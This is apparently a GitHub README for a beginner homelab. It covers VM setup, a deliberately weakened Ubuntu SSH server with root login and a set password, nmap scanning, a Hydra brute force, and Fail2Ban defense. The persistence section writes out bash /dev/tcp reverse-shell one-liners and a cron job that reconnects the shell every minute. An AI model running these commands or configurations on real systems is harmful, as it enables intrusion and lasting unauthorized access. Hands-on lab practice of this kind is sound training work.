# HomeLab
# Content:

- **Project Overview**
- **Homelab infrastructure**
- **Network Topologies**
- **Installation & Setup**
- **Attack Scenario**
- **Challenges and Solutions (** https://github.com/Aidantb8/Homelab)

**Project Overview**

This homelab walks through the process of setup, configuring ,securing, and simulate cyber attack (brute force attack through SSH)and apply some defense security ways .

Also apply cyber attack phases like:

- **Reconnaissance**
- **Exploitation:** 
- **Persistence:** 
- **Defense:** 

**Homelab Infrastructure**

- **Host Machine**: Hosted on a MacBook Air machine (macOS Sequoia v.15 )
- **Hardware**:
    - **CPU/Chip** : Apple M1  (ARM architecture)
    - **RAM**: 8GB
    - **Storage**: 256GB SSD

  [More Details](https://support.apple.com/en-us/111883)  

- **VM Machines :**

**Windows 11 Enterprise:** This will be used to simulate a business server/user 

**Ubuntu 24.04 (Target machine):** This will be used to simulate an enterprise software development environment.

**Kali Linux(Attacker machine)**: It comes pre-installed with a wide range of tools for vulnerability assessment,

exploitation, wireless testing, and digital forensics.

**Network Topologies:**

![Screenshot 2025-03-12 at 11.17.27.png](attachment:9cdcb5f8-d454-46c0-8758-380361267d55:Screenshot_2025-03-12_at_11.17.27.png)
![HomeLab](./images/ntwTopology.png)

**Installation 🏗️**

**Prerequisites**

- Upgrade your host machine to latest version
- Check the Virtual Platform App compatibility with your host machine architecture
- List all iso images you need and list their sizes
- make sure you have enough space , if not you can check other workarounds ( ex: Cloud )

**Setup**

1. Install Virtual Platform (parallels app)
2. Install all required iso images 
3. Configure network , IP setting if needed
4. Setup required tools
5. Start your attack scenarios

**Attack Scenario** 

**Configure Vulnerability Environment** ubuntu (target machine) :**:**

1- **Open SSH** (Open Secure Shell) is a suite of tools that provide secure network communication over an encrypted connection

Steps: 

 -Start and Enable the SSH Server and ensure it runs 

  `sudo systemctl start ssh`

  `sudo systemctl enable ssh`

-Change UFW(Uncomplicated Firewall )rules to be disable 

   `sudo ufw allow 22`

    `sudo ufw disable`

    `sudo ufw status`

-Verify SSH is running:

  `sudo systemctl status ssh`

- Allow remote root login with password authentication by edit the SSH configuration file .

Apply below changes uncomment if commented “Password Authentication” then comment prohibit-password and finally change PermitRootLogin to yes.

`sudo nano /etc/ssh/sshd_config` 

![Screenshot 2025-03-09 at 16.04.36.png](attachment:6c54794b-f4fb-4660-9bde-65ebdb3ac1f8:Screenshot_2025-03-09_at_16.04.36.png)

![Screenshot 2025-03-09 at 16.09.44.png](attachment:456e021d-fe96-40e7-99fe-e425e2e7e963:Screenshot_2025-03-09_at_16.09.44.png)

-Restart SSH service:

`sudo systemctl restart ssh`

-Set root’s password (use the password: november)

`sudo passwd root`

**Apply Attack** 

In this part of the lab series, we are going to simulate an end-to-end cyber-attack on business network. The end goal is to have access and achieve persistence inside the business network by apply [Cyber attack kill chain phases](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) 

## **1)Reconnaissance (Scanning & Discovery)**

First gather information about the target environment.

### **1.1-Scan the Network (for Live Hosts & Open Ports):**

From attacker Kali (Attacker machine):

`nmap -sn 10.211.55.0/24`

**Note**: Define the IP for target machine and scan IP range 

**Output:**

form the output we have 3 machines

![Screenshot 2025-03-11 at 09.47.48.png](attachment:7a751cc1-602d-43d9-a729-aaf749722025:Screenshot_2025-03-11_at_09.47.48.png)

### 1.2- **Scan for Open Ports & Services:**

Identify which services are running for 3 hosts 

`nmap -sV -Pn target_machine_IP`

- `sV`: Service version detection
- `p-`: Scan all ports

**Example Output:**

![Screenshot 2025-03-11 at 09.39.14.png](attachment:da8cc2b8-9f19-479d-ae19-7bcf9414bd58:Screenshot_2025-03-11_at_09.39.14.png)

This tells you the **Ubuntu Server** is running:

- **SSH (port 22)**

---

## **2)Exploitation (SSH Brute-Force Attack )**

-Attempting to login to the account using SSH , initiate a brute force and use a wordlists file(*rockyou.txt )*to see if there are any matches.

*-*wordlists file (*rockyou.txt)* comes installed as a default wordlist in Kali ,Navigate to the search menu and search “rockyou”

![Screenshot 2025-03-11 at 10.09.43.png](attachment:300cac3b-7cfb-4920-9917-7cb1529aae6c:Screenshot_2025-03-11_at_10.09.43.png)

---

Write command 

`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target_machin_IP`

- `l`: Username that may be provisioned by default, as root always has an account in Linux. We could try user, admin, administrator,user1 as well.
- `P`: Password list

After a few minutes, you should see Hydra locate the username and its associated
password.

**Remember** :we changed password to “november” for ubuntu server.

![Screenshot 2025-03-11 at 13.52.43.png](attachment:7f54c513-cd65-45ee-a50d-186c95f4fd6f:Screenshot_2025-03-11_at_13.52.43.png)

Attacker has access to the business machine ,so we can gain privilege escalation or gain access to sensitive data .

Its time to login @ ubuntu server ,since we have username & password.

`ssh root@target_machin_IP` 

![Screenshot 2025-03-11 at 13.57.39.png](attachment:50593e59-619a-4e47-9556-e4e8f4eec746:Screenshot_2025-03-11_at_13.57.39.png)

Performing some additional information gathering about OS version

`cat /etc/os-release`

![Screenshot 2025-03-11 at 14.03.59.png](attachment:46ee7990-2485-4aee-a025-d311697df54c:Screenshot_2025-03-11_at_14.03.59.png)

Getting hostname and IP

![Screenshot 2025-03-11 at 14.05.52.png](attachment:880e426e-4465-41ab-9605-3134c71198af:Screenshot_2025-03-11_at_14.05.52.png)

## **3)Persistence (Backdoors & Shells)**

After gaining access, 

1. **Create a Persistent Reverse Shell:**

On Ubuntu :

`bash -i >& /dev/tcp/10.211.55.6/4444 0>&1`

On Kali (listener):

`nc -lvnp 4444`

![Screenshot 2025-03-11 at 15.35.40.png](attachment:2990ece3-339c-443b-9d26-d3a5bc8abbd4:Screenshot_2025-03-11_at_15.35.40.png)

Add a **cron job** to reconnect every minute 

`sudo crontab -l`

`(crontab -l; echo "* * * * * bash -i >& /dev/tcp/10.0.0.4/4444 0>&1") | crontab -`

![Screenshot 2025-03-11 at 15.58.52.png](attachment:7b28912b-66e7-4ffd-a693-bb8a0a687744:Screenshot_2025-03-11_at_15.58.52.png)

---

## **4) Defense & Detection (Ubuntu Side)**

On the **Ubuntu Side**, We can practice some defensive techniques:

**4.1-Monitor with Fail2Ban:**
Block brute-force attempts:

`sudo apt install fail2ban`

      Edit the configuration file:

`sudo nano /etc/fail2ban/jail.local`

      Add or update the following section:

```
ini
CopyEdit
[sshd]
enabled = true
port    = ssh
filter  = sshd
logpath = /var/log/auth.log
maxretry = 5
bantime  = 10m
findtime = 10m
```

 **Restart Fail2Ban:**

`sudo systemctl restart fail2ban`

 **Monitor the Fail2Ban Logs:**
`sudo fail2ban-client status sshd`

![Screenshot 2025-03-11 at 16.05.03.png](attachment:0a61fd01-90ce-4f37-919c-67f56afbcb81:Screenshot_2025-03-11_at_16.05.03.png)

Try to enter false login credentials 5 times ,then check the fail2Ban logs

`ssh user@target-ip`

![Screenshot 2025-03-11 at 16.10.51.png](attachment:f6817ca5-d55f-4d6b-91ef-d4bcbf5a8658:Screenshot_2025-03-11_at_16.10.51.png)

**4.2-Check Logs for Suspicious Activity:**

`sudo cat /var/log/auth.log`

4.3-Check these tools logs:

`ps aux | grep -E 'nmap|nc|msf|hydra'`

![Screenshot 2025-03-11 at 14.25.55.png](attachment:f65392cb-304e-41bd-b45c-3ee009db0b8c:Screenshot_2025-03-11_at_14.25.55.png)

- **Challenges and Solutions**

- Virtual platform selection was time waste for your first time without define selection requirements in terms of compatibility ,storage and user usability .

-Host machine space limitation , try below steps :

     Clean your unwanted App & large documents

     Empty your trash 

     make sure there is no copy of old VM on your machine

     Finally , if you still have space issue try to check other cloud options (AWS,Azure ,Google Cloud **)**

-Cloud options limitations:

AWS : Require “Microsoft Remote Desktop” which is restricted in Egypt 

GCP : By default, GCP VMs don’t come with a GUI ,only terminal usage

Azure: signup issues not eligible in all countries 

**Useful links:**

https://projectsecurity.teachable.com/courses/build-a-cybersecurity-homelab-a-practical-guide-to-offense-defense-enterprise-101/lectures/59385586

https://cyberwoxacademy.com/building-a-cybersecurity-homelab-for-detection-monitoring/

https://www.youtube.com/watch?v=fsjs8XTi8JI&t=326s
